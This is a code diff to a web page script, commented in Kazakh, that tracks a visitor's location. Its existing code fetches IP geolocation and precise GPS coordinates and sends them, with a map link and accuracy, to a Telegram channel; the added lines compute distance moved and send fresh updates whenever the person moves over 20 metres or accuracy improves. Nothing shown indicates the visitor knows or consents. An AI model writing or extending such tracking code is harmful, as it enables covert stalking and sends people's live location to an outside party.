@@ -365,6 +365,22 @@
             }
         }
 
+        let lastSentLat = null;
+        let lastSentLon = null;
+        let bestAccuracy = 9999;
+
+        // Екі координат арасындағы қашықтықты (метрмен) есептейтін математикалық функция
+        function getDistanceMeters(lat1, lon1, lat2, lon2) {
+            const R = 6371e3; // Жердің радиусы (метр)
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            return R * c;
+        }
+
         function startLocationTracking() {
             // 1. IP АРҚЫЛЫ ОРЫН АЛУ (Резервті нұсқа: GPS қате көрсетсе немесе ғимарат ішінде болса, интернет арқылы табады)
             fetch('https://ipapi.co/json/')
@@ -382,6 +398,12 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
+                        
+                        // Алғашқы мәліметтерді сақтап қоямыз
+                        lastSentLat = lat;
+                        lastSentLon = lon;
+                        bestAccuracy = accuracy;
+                        
                         sendToTelegram(`📍 <b>Дәл қазіргі нақты орын (GPS):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу (${lat}, ${lon})</a>\n🎯 Дәлдік радиусы: ${accuracy.toFixed(1)} метр`);
                     },
                     (error) => console.warn("Орынды дәл табу қатесі:", error.message),
@@ -393,9 +415,34 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
-                        // Тек дәлдігі 100 метрден жақсы болса ғана жаңарту жіберу (артық спам болмас үшін)
-                        if(accuracy <= 100) {
-                            sendToTelegram(`📍 <b>Орын жаңартылды (Қозғалыста):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу</a>\n🎯 Дәлдігі: ${accuracy.toFixed(1)} метр`);
+                        
+                        // Спам болмауы үшін: тек адам 20 метрден астам қозғалса 
+                        // немесе GPS дәлдігі бұрынғыдан кем дегенде 10 метрге жақсарса ғана жібереміз
+                        let shouldSend = false;
+                        let reason = "";
+
+                        if (lastSentLat !== null && lastSentLon !== null) {
+                            const distance = getDistanceMeters(lastSentLat, lastSentLon, lat, lon);
+                            
+                            if (distance > 20) { 
+                                shouldSend = true;
+                                reason = `Адам қозғалды (${distance.toFixed(0)} метрге)`;
+                            } else if (accuracy < bestAccuracy - 10) { 
+                                shouldSend = true;
+                                reason = "GPS дәлдігі жақсарды";
+                            }
+                        }
+
+                        // Тек дәлдігі 100 метрден жақсы болса ғана жаңарту жіберу
+                        if (shouldSend && accuracy <= 100) {
+                            sendToTelegram(`📍 <b>Орын жаңартылды [${reason}]:</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу</a>\n🎯 Дәлдігі: ${accuracy.toFixed(1)} метр`);
+                            
+                            // Соңғы жіберілген координаталарды жаңартып қоямыз
+                            lastSentLat = lat;
+                            lastSentLon = lon;
+                            if (accuracy < bestAccuracy) {
+                                bestAccuracy = accuracy;
+                            }
                         }
                     },
                     (error) => console.warn("Watch қатесі:", error.message),
